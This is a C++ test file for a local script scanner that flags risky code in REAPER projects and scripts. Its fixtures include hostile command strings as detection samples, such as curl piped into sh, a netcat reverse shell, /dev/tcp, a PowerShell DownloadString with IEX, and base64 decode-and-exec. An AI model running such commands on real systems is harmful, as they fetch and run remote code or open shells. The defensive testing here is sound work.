// Tests for the local script scanner (fk::scan). Temp files only; nothing is executed, extracted or fetched.
#include <cstdio>
#include <filesystem>
#include <fstream>
#include <iostream>
#include "script_scan.hpp"
using namespace fk::scan;
namespace fs = std::filesystem;
static int g_fail = 0, g_run = 0;
#define CHECK(c, m) do { ++g_run; if (!(c)) { ++g_fail; std::cout << "[FAIL] " << m << "  (" #c ")\n"; } else std::cout << "[ ok ] " << m << "\n"; } while (0)

static bool has(const Report& r, const std::string& rule) { for (auto& f : r.findings) if (f.rule == rule) return true; return false; }
static bool has_line(const Report& r, const std::string& rule, std::size_t line) { for (auto& f : r.findings) if (f.rule == rule && f.line == line) return true; return false; }
static Report sc(const std::string& name, const std::string& text, const Options& o = {}) { return scan_text(name, text, o); }
static void put(const fs::path& p, const std::string& s) { fs::create_directories(p.parent_path()); std::ofstream(p, std::ios::binary) << s; }

static void languages() {
  CHECK(detect_language("a.py", "") == "python" && detect_language("x.LUA", "") == "lua" && detect_language("a.eel", "") == "eel" && detect_language("s.sh", "") == "shell", "extension detection");
  CHECK(detect_language("t.ps1", "") == "powershell" && detect_language("t.bat", "") == "batch" && detect_language("t.js", "") == "javascript" && detect_language("t.cpp", "") == "c/c++", "more extensions");
  CHECK(detect_language("song.RPP", "") == "reaper-project" && detect_language("reaper-kb.ini", "") == "reaper-actions" && detect_language("x.jsfx", "") == "jsfx", "REAPER file kinds");
  CHECK(detect_language("run", "#!/usr/bin/env python3") == "python" && detect_language("run", "#!/bin/bash") == "shell" && detect_language("fx", "desc:My Effect") == "jsfx", "shebang and JSFX header detection");
}
static void python_rules() {
  auto r = sc("a.py", "import os\nos.system('ls')\neval(x)\nimport subprocess\nsubprocess.run(['x'])\n");
  CHECK(has_line(r, "py-os-system", 2) && has_line(r, "py-eval", 3) && has(r, "py-subprocess"), "Python: os.system, eval, subprocess");
  CHECK(!has(sc("a.py", "# os.system('rm')\nprint(1)\n"), "py-os-system"), "Python: a commented-out call is not code");
  CHECK(!has(sc("a.py", "\"\"\"\nos.system('x')\n\"\"\"\nprint(1)\n"), "py-os-system"), "Python: text inside a triple-quoted docstring is not code");
  CHECK(!has(sc("a.py", "import re\nre.compile('x')\njson.load(f)\n"), "py-exec") && !has(sc("a.py", "re.compile('x')\n"), "py-eval"), "Python: re.compile / json.load are not flagged as exec/eval");
  CHECK(has(sc("a.py", "f = open('out.txt', 'w')\n"), "file-write-open") && !has(sc("a.py", "f = open('in.txt', 'r')\n"), "file-write-open"), "Python: open() with a write mode only");
  CHECK(has(sc("a.py", "import socket\n"), "py-socket") && has(sc("a.py", "import urllib.request\n"), "py-urllib") && has(sc("a.py", "import ctypes\nctypes.CDLL('x')\n"), "py-ctypes"), "Python: network and native-call modules");
  CHECK(has(sc("a.py", "import pickle\nx = pickle.loads(b)\n"), "py-pickle"), "Python: pickle.loads");
  auto d = sc("a.py", "import base64\nexec(base64.b64decode(blob))\n");
  CHECK(has(d, "decode-and-exec"), "decode-and-execute combination is flagged High");
  bool high = false; for (auto& f : d.findings) if (f.rule == "decode-and-exec" && f.severity == Severity::High) high = true;
  CHECK(high, "decode-and-exec severity is High");
}
static void lua_reaper_rules() {
  auto r = sc("s.lua", "os.execute('ls')\nlocal h = io.popen('x')\nloadstring(code)()\n");
  CHECK(has_line(r, "lua-os-execute", 1) && has_line(r, "lua-io-popen", 2) && has_line(r, "lua-loadstring", 3), "Lua: os.execute, io.popen, loadstring");
  CHECK(has(sc("s.lua", "load(s)\n"), "lua-load") && !has(sc("s.lua", "json.load(s)\ndownload(x)\n"), "lua-load"), "Lua: bare load() flagged; json.load() and download() are not");
  CHECK(!has(sc("s.lua", "-- os.execute('x')\nprint(1)\n"), "lua-os-execute") && !has(sc("s.lua", "--[[\nos.execute('x')\n]]\nprint(1)\n"), "lua-os-execute"), "Lua: line and block comments are ignored");
  CHECK(has(sc("s.lua", "reaper.ExecProcess('cmd', 0)\n"), "reaper-execprocess") && has(sc("s.py", "RPR_ExecProcess('c', 0)\n"), "reaper-execprocess"), "REAPER: ExecProcess in Lua and Python");
  CHECK(has(sc("s.lua", "reaper.SetExtState('a','b','c',true)\n"), "reaper-extstate-persist") && !has(sc("s.lua", "reaper.SetExtState('a','b','c',false)\n"), "reaper-extstate-persist"), "REAPER: persistent SetExtState only");
  CHECK(has(sc("s.lua", "reaper.AddRemoveReaScript(true, 0, p, true)\n"), "reaper-addremove") && has(sc("s.lua", "reaper.JS_Mem_Alloc(8)\n"), "reaper-jsmem") && has(sc("s.lua", "reaper.defer(loop)\n"), "reaper-defer"), "REAPER: AddRemoveReaScript, js_ReaScriptAPI memory, defer loop");
  CHECK(has(sc("s.lua", "package.loadlib('x','y')\n"), "lua-loadlib") && has(sc("s.lua", "package.cpath = p\n"), "lua-cpath"), "Lua: native library loading");
  CHECK(has(sc("fx.jsfx", "desc:Test\n@init\nfile_open(1)\n"), "jsfx-fileopen") && !has(sc("fx.jsfx", "desc:Test\n@sample\nspl0 = spl0*0.5;\n"), "jsfx-fileopen"), "JSFX: file access flagged; plain DSP not");
}
static void shell_ps_rules() {
  CHECK(has(sc("a.sh", "curl http://x.example/a | sh\n"), "sh-pipe-shell") && has(sc("a.sh", "curl -s x\n"), "sh-curl"), "shell: curl and pipe into sh");
  CHECK(has(sc("a.sh", "rm -rf /tmp/x\n"), "sh-rm-rf") && has(sc("a.sh", "nc -e /bin/sh 1.2.3.4 99\n"), "sh-nc-e") && has(sc("a.sh", "exec 3<>/dev/tcp/h/80\n"), "sh-dev-tcp"), "shell: rm -rf, netcat -e, /dev/tcp");
  CHECK(has(sc("a.ps1", "IEX (New-Object Net.WebClient).DownloadString('https://x.example/p')\n"), "ps-downloadstring") && has(sc("a.ps1", "powershell -EncodedCommand AAAA\n"), "ps-enc") && has(sc("a.ps1", "Invoke-Expression $x\n"), "ps-iex"), "PowerShell: DownloadString, -EncodedCommand, Invoke-Expression");
  CHECK(has(sc("a.bat", "bitsadmin /transfer j http://x.example/a a\n"), "win-bitsadmin") && has(sc("a.bat", "schtasks /create /tn x\n"), "win-schtasks") && !has(sc("a.bat", "REM certutil is just a comment\n"), "win-certutil"), "batch rules; REM comments ignored");
  CHECK(has(sc("a.js", "require('child_process').exec(c)\n"), "js-child-process") && has(sc("a.js", "eval(s)\n"), "js-eval") && !has(sc("a.js", "obj.eval(s)\n"), "js-eval"), "JavaScript: child_process, eval (not method calls)");
  CHECK(has(sc("a.cpp", "system(cmd);\n"), "c-system") && has(sc("a.cpp", "void* h = dlopen(p, 1);\n"), "c-dlopen") && !has(sc("a.cpp", "// system(cmd)\nint main(){}\n"), "c-system") && !has(sc("a.cpp", "ecosystem(1);\n"), "c-system"), "C/C++: system, dlopen; comments and identifiers like ecosystem( ignored");
}
static void network_and_secrets() {
  CHECK(has(sc("a.py", "u = 'https://evil.example/x'\n"), "url-host") && has(sc("a.py", "u = 'http://evil.example/x'\n"), "url-cleartext"), "URLs: https is Low, http is Medium");
  CHECK(has(sc("a.py", "u = 'http://203.0.113.9:8080/a'\n"), "url-ip-literal") && has(sc("a.py", "u = 'http://abcdefg.onion/'\n"), "url-onion"), "URLs: IP literals and .onion addresses");
  CHECK(!has(sc("a.py", "u = 'http://localhost:8080/'\n"), "url-cleartext") && !has(sc("a.py", "u = 'http://127.0.0.1/'\n"), "url-ip-literal"), "loopback URLs are not reported");
  Options o; o.allow_hosts = {"github.com"};
  CHECK(!has(sc("a.py", "u = 'https://api.github.com/x'\n", o), "url-host") && has(sc("a.py", "u = 'https://api.github.com/x'\n"), "url-host") && has(sc("a.py", "u = 'https://notgithub.com/x'\n", o), "url-host"), "--allow-host covers the host and its subdomains, not look-alikes");
  CHECK(!has(sc("a.py", "u = 'https://{host}/x'\n"), "url-host"), "templated hosts are skipped");
  auto k = sc("a.py", "password = \"hunter2hunter2\"\n");
  bool redacted = false, leaked = false;
  for (auto& f : k.findings) if (f.rule == "secret") { redacted = f.evidence == "[redacted]"; if (f.evidence.find("hunter2") != std::string::npos) leaked = true; }
  CHECK(redacted && !leaked, "secrets are reported by kind with the value redacted");
  CHECK(has(sc("a.py", "k = 'AKIAABCDEFGHIJKLMNOP'\n"), "secret"), "AWS-style key id flagged as a possible secret");
  CHECK(has(sc("a.py", "x = '" + std::string(150, 'A') + "'\n"), "long-base64") && !has(sc("a.py", "x = 'short'\n"), "long-base64"), "long encoded blobs flagged");
  std::string esc; for (int i = 0; i < 50; ++i) esc += "\\x41";
  CHECK(has(sc("a.py", "x = '" + esc + "'\n"), "escape-heavy"), "heavy \\x escape sequences flagged");
  CHECK(has(sc("a.sh", "echo x > /dev/null; crontab -l\n"), "any-crontab") && has(sc("a.sh", "systemctl enable foo\n"), "any-systemctl"), "persistence keywords");
}
static void reaper_files() {
  std::string rpp = "<REAPER_PROJECT 0.1 \"6.0\" 1\n  <TRACK\n    <FXCHAIN\n      <VST \"VST3: ReaEQ\" reaeq.vst3 0 \"\" 123\n        " + std::string(60, 'Q') + "AAAA==\n      >\n      <JS \"loudness_meter\" \"\"\n      >\n    >\n    <ITEM\n      FILE \"/home/x/audio/take1.wav\"\n    >\n  >\n>\n";
  auto r = sc("song.RPP", rpp);
  CHECK(has(r, "rpp-plugin") && has(r, "rpp-external-path") && has(r, "rpp-state-blob"), ".RPP: plugin inventory, external media path, state blobs noted");
  CHECK(!has(r, "long-base64"), ".RPP: plugin-state base64 is summarised, not flagged as an obfuscated blob");
  auto kb = sc("reaper-kb.ini", "SCR 4 0 RS123 \"Script: do.lua\" \"Scripts/do.lua\"\nACT 0 0 \"x\" \"Custom\" 40001\n");
  CHECK(has(kb, "kb-script") && has(kb, "kb-custom-action"), "reaper-kb.ini: registered scripts and custom actions listed");
}
static void paths_and_baseline() {
  auto root = fs::temp_directory_path() / "hush_scan_test"; fs::remove_all(root);
  put(root / "a.py", "import subprocess\nsubprocess.run(['x'])\n");
  put(root / "sub/b.lua", "print('hi')\n");
  put(root / "notes.txt", "see https://example.org/page\n");
  std::string elf = std::string("\x7f" "ELF") + std::string(100, '\0');
  put(root / "plug.vst3", elf);
  put(root / "tool.bin", elf);
  put(root / "pack.zip", std::string("PK\x03\x04") + std::string(40, '\0'));
  std::string u16 = std::string("\xFF\xFE"); for (char c : std::string("os.execute('x')\n")) { u16.push_back(c); u16.push_back('\0'); }
  put(root / "w.lua", u16);
  std::error_code ec; fs::create_symlink(root / "a.py", root / "link.py", ec);
  auto r = scan_path(root);
  CHECK(r && r->files.size() >= 7, "directory scan lists every regular file (symlink skipped)");
  bool saw_link = false; for (auto& f : r->files) if (f.path == "link.py") saw_link = true;
  CHECK(!saw_link && r->skipped >= 1, "symbolic links are skipped, not followed");
  CHECK(has(*r, "py-subprocess") && has(*r, "url-host") && has(*r, "native-plugin-binary") && has(*r, "native-binary") && has(*r, "archive-not-opened"), "mixed tree: scripts scanned; binaries and archives only inventoried");
  bool binary_note = false; for (auto& f : r->files) if (f.path == "plug.vst3") binary_note = (f.language.find("ELF") != std::string::npos && !f.scanned && !f.sha256.empty());
  CHECK(binary_note, "native binary is hashed and labelled, not analyzed");
  CHECK(has(*r, "lua-os-execute"), "UTF-16 (BOM) scripts are still scanned");
  CHECK(r->to_text().find("Limitations") != std::string::npos && r->to_json().find("\"requires_human_review\": true") != std::string::npos, "reports state their limitations");
  Options small; small.max_file_bytes = 10;
  auto s = scan_path(root, small); bool too_big = false; if (s) for (auto& f : s->files) if (f.path == "a.py") too_big = !f.scanned && !f.sha256.empty();
  CHECK(s && too_big, "files over the size limit are hashed but not scanned");
  Options few; few.max_files = 2; auto fw = scan_path(root, few);
  CHECK(fw && fw->files.size() == 2 && !fw->limitations.empty(), "file-count limit is enforced and reported");
  CHECK(!scan_path(root / "missing") && !scan_path(root / "link.py"), "missing paths and symlink roots are refused");
  // baseline
  std::string base;
  for (auto& f : r->files) base += f.sha256 + "  ./" + f.path + "\n";
  put(root.parent_path() / "hush_scan_base.txt", base);
  Options bo; bo.baseline_path = (root.parent_path() / "hush_scan_base.txt").string();
  auto same = scan_path(root, bo);
  CHECK(same && same->baseline.used && same->baseline.modified.empty() && same->baseline.new_files.empty() && same->baseline.missing.empty(), "baseline: an unchanged tree matches");
  put(root / "a.py", "print('tampered')\n"); put(root / "extra.sh", "echo hi\n"); fs::remove(root / "notes.txt");
  auto diff = scan_path(root, bo);
  CHECK(diff && diff->baseline.modified.size() == 1 && diff->baseline.modified[0] == "a.py" && diff->baseline.new_files.size() == 1 && diff->baseline.new_files[0] == "extra.sh" && diff->baseline.missing.size() == 1 && diff->baseline.missing[0] == "notes.txt", "baseline: modified, new and missing files are reported");
  CHECK(has(*diff, "baseline-modified") && has(*diff, "baseline-new") && has(*diff, "baseline-missing"), "baseline differences become findings");
  put(root.parent_path() / "hush_scan_badbase.txt", "not a hash line\n");
  Options bad; bad.baseline_path = (root.parent_path() / "hush_scan_badbase.txt").string();
  CHECK(!scan_path(root, bad), "a malformed baseline file is rejected");
  auto js = diff->to_json();
  CHECK(js.find("\"findings\"") != std::string::npos && js.find("\"modified_files\": [\"a.py\"]") != std::string::npos, "JSON report carries findings and integrity lists");
  auto q = sc("q.py", "x = \"a\\\"b\"\nos.system(\"say \\\"hi\\\"\")\n");
  CHECK(q.to_json().find("\\\"") != std::string::npos, "JSON escapes quotes in evidence");
  fs::remove_all(root); fs::remove(root.parent_path() / "hush_scan_base.txt"); fs::remove(root.parent_path() / "hush_scan_badbase.txt");
}
int main() {
  languages(); python_rules(); lua_reaper_rules(); shell_ps_rules(); network_and_secrets(); reaper_files(); paths_and_baseline();
  std::cout << "\n" << (g_run - g_fail) << "/" << g_run << " checks passed\n";
  return g_fail == 0 ? 0 : 1;
}
